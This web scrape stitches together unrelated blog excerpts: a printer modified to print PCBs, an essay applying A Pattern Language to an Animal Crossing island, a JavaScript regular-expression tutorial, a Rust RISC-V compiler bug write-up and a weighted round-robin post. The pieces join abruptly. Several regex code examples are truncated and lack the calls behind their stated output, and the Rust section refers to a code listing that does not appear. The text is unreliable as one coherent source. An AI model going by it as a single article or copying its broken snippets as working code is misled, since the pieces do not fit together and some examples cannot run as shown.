<p> The build modifies a Lexmark E460dn laserjet printer to mark PCBs directly, using an aluminum carrier plate instead of its normal paper feed operation.</p>
<p>An Arduino is utilized to hijack and output printer signals, enabling it to it to work in a much different way than how it was originally designed. The carrier plate, with blank PCB material taped on, is fed into the front and the PCB is pulled through and properly marked by the printer. After a dip in acetone to allow the toner to stick to the copper, the board is ready to etch!</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/ac.png" src="https://jamesstuber.com/img/ac/low/ac.png" alt="Tom Nook holding a book"></figure>

<p>We live in houses maximized for square footage and filled with <a href="https://www.theverge.com/2016/8/3/12325104/airbnb-aesthetic-global-minimalism-startup-gentrification" target="_blank">commoditized furniture</a>. Our neighborhoods feel soulless, disconnected. Cities around the world are laid out with complicated zoning and laws that are <a href="https://twitter.com/_fruchtose/status/1271280300228632576" target="_blank">impossible to navigate</a>.</p>

<p>It feels like we don’t have much control over our environment.</p>

<p>How can I do anything about my surroundings without an Architecture degree or a Masters in Urban Planning? We’re all focused on screens anyway, so this environment stuff can’t be that big of a deal, right?</p>

<p>But the physical space around you <em>does</em> have a strong influence–on your mood and even on your behavior. The layout of your town or city changes who you interact with, and what those interactions look like. In our homes, lighting, smell, and even the arrangement of furniture all affect us in subtle ways, even if we are tied to our screens.</p>

<h2 id="beautiful-spaces-vs-livable-spaces">Beautiful Spaces vs. Livable Spaces</h2>

<p>It’s easy to joke about the bachelor pad with a single chair and a Playstation. This type of room would make any visitor feel uncomfortable. Even if the owner claims to not mind the sparse environment, his surroundings invite him only to play video games.</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image9.jpg" src="https://jamesstuber.com/img/ac/low/image9.jpg" alt="A sparse room with only a chair and a tv"></figure>

<p>What’s harder to see are the rooms we find on Pinterest or Instagram. They look beautiful. We aspire to have something equally share-worthy. But what happens when you design a room for your eyes, but live in it with your body?</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image16.jpg" src="https://jamesstuber.com/img/ac/low/image16.jpg" alt="A beautiful looking bedroom with many pillows"></figure>
<p><em>Photo by <a href="https://unsplash.com/@devano23?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank">Devon Janse van Rensburg</a></em></p>

<p>This room <em>looks</em> cozy. But the illusion breaks down as soon as you <em>live</em> in it. Bedtime means moving at least seven pillows. Where? Probably to the ground. The nightstand decorations, so meticulously placed, now block any space for your water glass, your phone, your reading glasses. Waking up in the morning means groggily tiptoeing around pillows strewn everywhere. Try not to fall over as you pull on your socks.</p>

<p>Now that many of us are stuck at home, the effects of our surroundings are starting to feel more salient. Uncertain supply chains, Zoom meetings, and increased time at home necessitate a more DIY approach. If anything, <a href="https://shreeda.substack.com/p/a-new-old-pattern-language" target="_blank">now is the time</a> to learn how to improve our own environments.</p>

<h2 id="a-pattern-language">A Pattern Language</h2>

<figure><a href="https://amzn.to/2XrQ8Tx" target="_blank"><img data-progressive="https://jamesstuber.com/img/ac/image17.png" src="https://jamesstuber.com/img/ac/low/image17.png" alt="A Pattern Language Cover"></a></figure>

<p>One of the best books on the subject is <a href="https://amzn.to/2XrQ8Tx" target="_blank">A Pattern Language</a> by Christopher Alexander. Published in 1977, the book outlines a series of architectural patterns (253 of them) that form pleasant environments. Starting on the scale of cities, suburbs, and rural land, A Pattern Language scopes all the way down to the arrangement of seating in a room. Alexander manages to do all this without falling to <a href="https://www.ribbonfarm.com/2010/07/26/a-big-little-idea-called-legibility/" target="_blank">legibility traps</a>.</p>

<p>A Pattern Language is written with the idea that homes and towns should be largely designed by the people who live in them. Rather than a definite prescription, the patterns are more like guidelines, meant to be applied with the local context in mind. Each pattern is numbered for reference and can be used individually or in conjunction with others. Combined, they create beautiful–and more importantly–livable spaces.</p>

<p>One of my favorite patterns is <em>Window Place (180)</em></p>

<blockquote>
<p>“Everybody loves window seats, bay windows, and big windows with low sills and comfortable chairs drawn up to them.</p>

<p>In every room where you spend any length of time during the day, make at least one window into a ‘window place’”</p>
</blockquote>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image8.jpg" src="https://jamesstuber.com/img/ac/low/image8.jpg" alt="Seating by a window"></figure>

<p>We’re often drawn towards bright windows, without explicitly knowing why. We also seek comfort in chairs, couches. But what happens when the only place to sit is far from the window? Without <em>window places</em> <em>(180)</em>, we bounce between wanting to be comfortable in a chair or wanting to look out the window.</p>

<p>Look at this cozy window place:</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image14.jpg" src="https://jamesstuber.com/img/ac/low/image14.jpg" alt="Window photo by Rob Wingate"></figure>
<p><em>Photo by <a href="https://unsplash.com/@robwingate?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" target="_blank">Rob Wingate</a></em></p>

<p>This kind of place looks nice to the eye, yes, but it also invites you to sit and read a book, to watch the birds, to stare into space. Window places make a room more comfortable to be in. They make <em>living</em> better.</p>

<h3 id="a-confession">A Confession</h3>

<p>I often list A Pattern Language as one of my favorite books. But I have a confession…I’ve never actually read it! Why? Despite loving the idea of patterns, implementation still felt inaccessible to me. I’m not in a position to build a house from scratch, and I’m certainly not in a position to layout a new town. Without a way to apply the patterns I struggled to learn them.</p>

<h3 id="enter-animal-crossing">Enter Animal Crossing</h3>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image24.jpg" src="https://jamesstuber.com/img/ac/low/image24.jpg" alt="Animal Crossing Promo Image"></figure>

<p>Animal Crossing is a simple game. You and an entrepreneurial racoon set up a tent on a deserted island. You’re encouraged to do exciting things like pick up weeds, chop wood, or talk to your anthropomorphic neighbors. The ‘goal’ of the game is to build an island where other animals want to live…and pay off your suspiciously large mortgage.</p>

<p>So how did a game about doing your chores sell 5 million copies in its first month? And what on earth does this have to do with A Pattern Language?</p>

<p>Animal Crossing sold 5 million copies because it’s <em>comfortable</em>.</p>

<p>Everything from the <a href="https://www.youtube.com/watch?v=A4mN7CsAys8" target="_blank">soundscape</a> to the <a href="https://twitter.com/Rheiret/status/1259523659846135808" target="_blank">horrible fish puns</a> is meticulously designed to make you feel at ease.</p>

<p>A big source of this comfort lies in the games’ inherent use of Alexander’s Patterns.</p>

<p>Many Patterns are built into the game; knowingly or not: the island is dotted with <em>fruit trees (170)</em> and <em>pools and streams (64)</em>, the buildings are all set up with <em>south facing outdoors (105)</em>, and the wild nature of the island provides a natural <em>connection to the earth (168)</em>.</p>

<p>It’s quite easy to build a town which follows a lot of Alexander’s patterns.</p>

<p>Can you see where this is going?</p>

<p>I decided to improve my Animal Crossing island by applying ideas from A Pattern Language.</p>

<figure><a href="https://twitter.com/uberstuber/status/1252676289430839297" target="_blank"><img data-progressive="https://jamesstuber.com/img/ac/image11.png" src="https://jamesstuber.com/img/ac/low/image11.png" alt="tweet from @uberstuber about Animal Crossing and A Pattern Language"></a></figure>

<p>In this way, I could gain a better understanding of A Pattern Language <strong>and</strong> have an excuse to play video games (<a href="https://fortelabs.co/blog/visualizing-the-theory-of-constraints-with-mini-metro" target="_blank">this isn’t the first time I’ve done something like this</a>).</p>

<h2 id="animal-crossing-x-a-pattern-language">Animal Crossing x A Pattern Language</h2>

<p>In Animal Crossing, we have the responsibility of placing houses, shops, and other buildings. Let’s start on a macro level by applying patterns to the layout of our island:</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image27.jpg" src="https://jamesstuber.com/img/ac/low/image27.jpg" alt="A map of my Animal Crossing Island"></figure>
<p><em>A map of my Animal Crossing island</em></p>

<h3 id="14-identifiable-neighborhood">14 identifiable neighborhood</h3>

<blockquote>
<p>“People need an identifiable spatial unit to belong to.”</p>
</blockquote>

<h3 id="29-density-rings">29 density rings</h3>

<blockquote>
<p>“Define rings of decreasing local housing density around the nucleus.”</p>
</blockquote>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image12.jpg" src="https://jamesstuber.com/img/ac/low/image12.jpg" alt="Map with neighborhoods circled"></figure>

<p>To comply with the <em>density rings (29)</em> pattern, I’ve placed most of the housing downtown, near the town center, shops, and museum.</p>

<p>As you move away from the city, the houses spread out, but they still belong to small <em>identifiable neighborhoods (14)</em>: housing nestled between the cliffs and the river, beachfront housing with no fences, and bougie hill living. Each neighborhood maintains its identity with unique pathing, lot shapes, and plants.</p>

<h3 id="62-high-places">62 High Places</h3>

<blockquote>
<p>“The instinct to climb up to some high place, from which you can look down and survey your world, seems to be a fundamental human instinct…build occasional high places as landmarks throughout the city.”</p>
</blockquote>

<p>Sacré-Cœur in Paris is the second most visited landmark in Paris. The basilica owes its popularity to two major factors: beautiful architecture, and its location on the largest hill in Paris. Sacré-Cœur calls you to climb Monmarte hill, and when you get there you’ll be rewarded with an amazing view of the city.</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image10.jpg" src="https://jamesstuber.com/img/ac/low/image10.jpg" alt="Photo of Sacre Coeur in Paris"></figure>

<p>New visitors to Animal Crossing islands stay at a campsite. I want new guests to be wowed by all my island has to offer, and what better way for them to see it than from a <em>high place (62)</em>.</p>

<p>In the Northeast, I’ve built a tall hill just for the campsite. From here visitors can enjoy beautiful ocean views, or look down on the burgeoning city.</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image19.jpg" src="https://jamesstuber.com/img/ac/low/image19.jpg" alt="An Animal Crossing campsite"></figure>

<p>It’s not as grand as the basilica at Sacré-Cœur, but my visitors enjoy it all the same.</p>

<h3 id="31-promenade">31 Promenade</h3>

<blockquote>
<p>“Encourage the gradual formation of a promenade at the heart of every community, linking the main activity nodes. Put main points of attraction at the two ends, to keep a constant movement up and down.”</p>
</blockquote>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image15.jpg" src="https://jamesstuber.com/img/ac/low/image15.jpg" alt="My map with a promenade circled"></figure>

<p>Circled here is my island’s “promenade”. It’s a <em>shopping street (32)</em>, complete with a museum, a bodega, and a tailor. Just below it is a <em>small public square (61)</em> with some seating for tired shoppers. To finish out the pattern, the <em>promenade (31)</em> is bookended by a <em>carnival (58)</em> and an <em>adventure playground (73)</em>.</p>

<h3 id="59-quiet-back">59 Quiet back</h3>

<blockquote>
<p>“Build a walk along this quiet back…protected from noise by walls and buildings…connect it up with other walks…converge on the local pools and streams…”</p>
</blockquote>

<p>Sometimes the hustle and bustle of a main shopping street is too much. A quiet back provides a more peaceful area for introverts to take a walk.</p>

<p>For a real-life example, compare Takeshita street in Harajuku with this quiet back literally a block away:</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image18.jpg" src="https://jamesstuber.com/img/ac/low/image18.jpg" alt="Takeshita street in Harajuku"></figure>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image7.jpg" src="https://jamesstuber.com/img/ac/low/image7.jpg" alt="A real life quiet back in Harajuku"></figure>

<p>I placed a <em>quiet back (59)</em> behind my island’s main <em>shopping street (32)</em>. Below, an introverted resident and I relax away from the crowd. This slightly hidden path along the river creates a nice getaway that’s still close to the city.</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image2.jpg" src="https://jamesstuber.com/img/ac/low/image2.jpg" alt="A quiet back in Animal Crossing"></figure>

<h3 id="a-pattern-language-and-gardens">A Pattern Language and Gardens</h3>

<p>Alexander puts great emphasis on green spaces, gardens and parks, flowers and trees, and for good reason. Looking at greenery has a <a href="https://www.nationalgeographic.com/travel/lists/forest-bathing-nature-walk-health/" target="_blank">calming effect</a> and promotes well-being. Residents can contribute to their community by growing and maintaining gardens.</p>

<p>In the center of town I’ve placed a zen garden. See if you can spot these patterns:</p>

<ul>
<li>Outdoor Room (163)</li>
<li>Garden Wall (173)</li>
<li>Garden Seat (176)</li>
<li>Connection to the Earth (168)</li>
</ul>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image4.jpg" src="https://jamesstuber.com/img/ac/low/image4.jpg" alt="A Zen Garden in Animal Crossing"></figure>

<p>Below is an excellent example of a yard, not from my island but from <a href="https://www.youtube.com/watch?v=YgAl2llvXVs&amp;list=PLwGyU0mZTYHUCWRuo4V8kmhv8DrRHpnq1" target="_blank">Austin John Plays</a> (the roped off area will become a house).</p>

<figure><img data-progressive="https://jamesstuber.com/img/ac/image1.jpg" src="https://jamesstuber.com/img/ac/low/image1.jpg" alt="Animal Crossing Yard"></figure>

<p>Intentionally or not, Austin uses quite a few of the Patterns outlined in Alexander’s book: 111, 112, 173, 105…</p>

<h3 id="111-half-hidden-garden">111 Half hidden garden</h3>

<blockquote>
<p>“Do not place the garden fully in front of the house, nor fully to the back. Instead, place it in some kind of half-way position, side-by-side with the house, half hidden from the street, half exposed”</p>
</blockquote>

<p>A fully exposed garden will be awkward to work in, but a private garden won’t be used either. The shorter fencing here allows the resident to work in comfort while still being able to chat with neighbors who walk by.</p>

    <h2>Let's make regular expressions less scary together</h2>

        </figure>
        <p>The first time I encounter a regular expression was many years ago, but I still remember my first thoughts on it:</p>
<ol>
<li>What is this string-like thing?</li>
<li>I rather don’t touch it, looks scary</li>
</ol>
<p>I don’t remember quite well what that regex was doing, or how exactly looked like, but it scared me to death. Looking in retrospective I realize that it was probably not scary at all and that in fact, it was an easy way to solve the problem in hand. But why did I got this feeling? It’s just the awkwardness of the syntax, they certainly look strange, and if you don’t know what they are, they look very complicated.</p>
<p>My intention here is not to scare you out, regex can be simple once we understand them, but if you don’t and you look at something like this:</p>
<div><pre><code data-lang="text">^\(*\d{3}\)*( |-)*\d{3}( |-)*\d{4}$
</code></pre></div><p>Can be intimidating…</p>
<p>Today we are going to demystify regular expressions, we will see what they are, what they are useful for, and how you can design your regular expressions to solve problems.</p>
<hr>
<h2 id="what-are-regular-expressions">What are regular expressions</h2>
<p>Regular expressions are a way to describe patterns in data strings. They have their own syntax, as is they are their own programming language, and there are methods and ways to interact with regular expressions in most (if not all) programming languages.</p>
<p>But what kind of patterns are we talking about? common examples of regular expressions determine for example if a given string is an email address or a phone number, or they can be used to verify if a password fulfills a certain complexity.</p>
<p>Once you have the pattern, what can you do with the regular expressions?</p>
<ul>
<li>validate a string with the pattern</li>
<li>search within a string</li>
<li>replace substrings in a string</li>
<li>extract information from a string</li>
</ul>
<hr>
<h2 id="working-with-regular-expressions">Working with regular expressions</h2>
<p>For this article, we are going to cover how to work with regular expressions in JavaScript, though the concepts learned here apply to other languages as well. With that said, in other languages, there may be some differences in the way they treat regular expressions.</p>
<p>Let’s look at an example that will validate if the string contains the word <code>Hello</code> or not.</p>
<p>In JavaScript there are 2 ways to going about this:</p>
<ul>
<li>Constructor</li>
<li>Literal</li>
</ul>
<h3 id="constructor">Constructor</h3>
<div><pre><code data-lang="javascript"><span>const</span> <span>regex</span> <span>=</span> <span>new</span> RegExp(<span>'Hello'</span>)
<span>const</span> <span>result</span> <span>=</span> <span>regex</span>.<span>test</span>(<span>'Hello World!'</span>)
<span>console</span>.<span>log</span>(<span>result</span>)

<span>--------------</span>
<span>Output</span>
<span>--------------</span>
<span>true</span>
</code></pre></div><h3 id="literal">Literal</h3>
<div><pre><code data-lang="javascript"><span>const</span> <span>regex</span> <span>=</span> <span>/Hello/</span>
<span>const</span> <span>result</span> <span>=</span> <span>regex</span>.<span>test</span>(<span>'Hello World!'</span>)
<span>console</span>.<span>log</span>(<span>result</span>)

<span>--------------</span>
<span>Output</span>
<span>--------------</span>
<span>true</span>
</code></pre></div><p>In both scenarios, the variable <code>regex</code> is an object, which exposes different methods we can use to interact with the regular expression. However, the first example has a more familiar look, instancing an object with a <code>string</code> as a parameter. In the second scenario things look a bit weird, there is something that resembles a <code>string</code> but instead of quotes is wrapped in <code>/</code>. As it turns out both ways represent the same, I personally like the second option, which is very clean, and IDEs or code editors can have syntax highlighting on the regular expression compared to the first scenario where the regular expression pattern is defined just as a string.</p>
<p>So far our regular expressions have been fairly simple, is just the exact match on the string <code>Hello</code> and it worked perfectly for JavaScript, however the result we obtained can be different for other languages, even though the regular expression is the same. This is because each programming language can define certain defaults or special behaviors in their regular expressions which can vary from one to another. So sorry about that, but is just how it is. When we build a RegEx, though for the most part will be the same in most programming languages, before you use it somewhere else you will have to test it and adjust it if necessary.</p>
<hr>
<h2 id="different-uses-of-regular-expressions">Different uses of regular expressions</h2>
<p>When working with regular expressions we are basically working with the RegExp object methods, or with string methods which allows us to interact with regular expressions.</p>
<h3 id="regexpprototypetest">RegExp.prototype.test()</h3>
<p>The <code>test()</code> method executes a search for a match between a regular expression and a specified string. Returns <code>true</code> or <code>false</code>.</p>
<p>Example: Look if the specified string contains the string <code>foo</code></p>
<div><pre><code data-lang="javascript"><span>const</span> <span>str</span> <span>=</span> <span>'table football'</span>

<span>const</span> <span>regex</span> <span>=</span> RegExp(<span>'foo'</span>)
<span>console</span>.<span>log</span>(<span>regex</span>.<span>test</span>(<span>str</span>))

<span>-------------</span>
<span>Output</span>
<span>-------------</span>
<span>true</span>
</code></pre></div><h3 id="regexpprototypeexec">RegExp.prototype.exec()</h3>
<p>The <code>exec()</code> method executes a search for a match in a specified string. Returns a result array, or null.</p>
<p>Example: Look for all the instances of <code>foo</code> in the given string</p>
<div><pre><code data-lang="javascript"><span>const</span> <span>str</span> <span>=</span> <span>'table football, foosball'</span>
<span>const</span> <span>regex</span> <span>=</span> <span>/foo/g</span>

<span>let</span> <span>result</span>;
<span>while</span> ((<span>result</span> <span>=</span> <span>regex</span>.<span>exec</span>(<span>str</span>)) <span>!==</span> <span>null</span>) {
  <span>console</span>.<span>log</span>(<span>`Found </span><span>${</span><span>result</span>[<span>0</span>]<span>}</span><span> at </span><span>${</span><span>result</span>.<span>index</span><span>}</span><span>.`</span>);
}

<span>-------------</span>
<span>Output</span>
<span>-------------</span>
<span>Found</span> <span>foo</span> <span>at</span> <span>6.</span>
<span>Found</span> <span>foo</span> <span>at</span> <span>16.</span>
</code></pre></div><h3 id="stringprototypematch">String.prototype.match()</h3>
<p>The <code>match()</code> method retrieves the result of matching a string against a regular expression.</p>
<p>Example: Find all the capital letters on a string</p>
<div><pre><code data-lang="javascript"><span>const</span> <span>paragraph</span> <span>=</span> <span>'The quick brown fox jumps over the lazy dog. It barked.'</span>
<span>const</span> <span>regex</span> <span>=</span> <span>/[A-Z]/g</span>

<span>Output</span>
<span>-------------</span>
Array [<span>"T"</span>, <span>"I"</span>]
</code></pre></div><h3 id="stringprototypematchall">String.prototype.matchAll()</h3>
<p>The <code>matchAll()</code> method returns an iterator of all results matching a string against a regular expression, including capturing groups.</p>
<p>Example: Find occurrences of a string in groups</p>
<div><pre><code data-lang="javascript"><span>const</span> <span>regexp</span> <span>=</span> <span>/t(e)(st(\d?))/g</span>
<span>const</span> <span>str</span> <span>=</span> <span>'test1test2'</span>

</code></pre></div><h3 id="stringprototypesearch">String.prototype.search()</h3>
<p>The <code>search()</code> method executes a search for a match between a regular expression and this string object. It returns the index at which the matched happened, or -1 is there is no match.</p>
<p>Example: Find the position of any character that is not a word character or white space</p>
<div><pre><code data-lang="javascript"><span>const</span> <span>paragraph</span> <span>=</span> <span>'The quick brown fox jumps over the lazy dog. If the dog barked, was it really lazy?'</span>

</code></pre></div><h3 id="stringprototypereplace">String.prototype.replace()</h3>
<p>The <code>replace()</code> method returns a new string with some or all matches of a pattern replaced by a replacement. The pattern can be a string or a RegExp, and the replacement can be a string or a function to be called for each match. If the pattern is a string, only the first occurrence will be replaced.</p>
<p>Note that the original string will remain unchanged.</p>
<p>Example: Replace the word dog with monkey</p>
<div><pre><code data-lang="javascript"><span>const</span> <span>paragraph</span> <span>=</span> <span>'The quick brown fox jumps over the lazy dog. If the dog barked, was it really lazy?'</span>

</code></pre></div><p>Not to be mistaken here, the method replace() uses regular expressions, so even when we pass a string, it will be interpreted as a regular expression and executed as such. Hence the reason why on the second console.log the word dog got replaced only once. But we will cover more on that later.</p>
<h3 id="stringprototypereplaceall">String.prototype.replaceAll()</h3>
<p>The <code>replaceAll()</code> method returns a new string with all matches of a pattern replaced by a replacement. The pattern can be a string or a RegExp, and the replacement can be a string or a function to be called for each match.</p>

          <p>My
<a href="https://www.codethink.co.uk/articles/2020/improving-risc-v-linux-support-in-rust/">previous blog post</a>
introduced my work to improve <a href="https://www.rust-lang.org/">Rust's</a> support for
<a href="https://riscv.org/">RISC-V</a> Linux systems. Since then I fixed a couple of
interesting compiler bugs. This blog post is more technical - describing these
bugs and explaining some <code>rustc</code> internals along the way. I conclude by
reporting on movement in the broader Rust community regarding RISC-V. I
assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from
<a href="https://github.com/rust-lang/rust/blob/master/src/librustc_resolve/late.rs#L1287"><code>src/librustc_resolve/late.rs</code></a>:</p>

<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>
<p><a href="https://github.com/rust-lang/rust/blob/master/src/librustc_span/symbol.rs#L1041"><code>Symbol</code></a>
is the type representing an interned string:</p>
<div><pre><span></span><span>#[derive(Clone, Copy, PartialEq, ParitialOrd, Hash)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Symbol</span><span>(</span><span>SymbolIndex</span><span>);</span><span></span>
</pre></div>


<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which
provides the <code>Ord</code>ering of <code>Vec::sort</code> above) derives from the index's <code>Ord</code>ering.
But where does the index come from?</p>

<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p><strong>UPDATE 6/25/2020:</strong> The bottom of the post now has a section about using 2D low discrepancy sequences with an alias table and compares results vs the 1D methods.  The code has been updated as well to include that stuff.</p>
<p>In this post we are going to talk about Round Robin first, then Weighted Round Robin.</p>
<p>The ~500 lines of standalone C++ that generated the data for this blog post can be found at <a href="https://github.com/Atrix256/WeightedRR" rel="nofollow">https://github.com/Atrix256/WeightedRR</a></p>

<p>Let’s say you find yourself in one of these 2 equivalent scenarios:</p>
<ol>
<li>You want to repeatedly choose from a list of 10 objects in a fair way, where the objects are chosen at roughly the same rate – like, a loot drop table for killing monsters in a game.</li>
<li>You have 10 queues of work that you want to process work items from in a fair way, where work is consumed from the queues at roughly the same rate.</li>
</ol>
<p>In either case you want a stream of integers between 0 and 9 where ideally any section – large or small – should have roughly even counts of those numbers chosen.  In other words, it should have a flat histogram for both large and small sections.</p>
<p>One way to deal with this is to just walk through the numbers 0 through 9 over and over and over.  You could increment a number whenever you wanted the next index and use modulus to ensure it was between 0 and 9.</p>
<p>I’m calling this “Sequential” in the graphs and that would work, but depending on your usage case, it might be undesirable that it was so obviously going in order from 0 to 9.</p>
<p>Another way to deal with this would be to roll a random integer 0 through 9 and use that as your answer.  In the code, I roll a random float between 0 and 1 and remap that to an integer 0 through 9 so it’s more like the other methods.  I’m calling this “White Noise” in the graphs and that also would work in that the histogram is going to be flat after an infinite number of samples, but it won’t be very flat in small numbers of samples.</p>
<p>Yet another way to deal with this is to use a low discrepancy sequence (deterministic or randomized aka blue noise) such as the golden ratio additive recurrence low discrepancy sequence which looks like this:</p>
<pre title="">float GetNextValue(float x)
{
  float newX = x + 1.61803398875f;
  return newX - floor(newX);
}
</pre>
<p>In the above, the first value you ever plug into this function can be any number.  It can be 0.0, but it doesn’t have to be.</p>
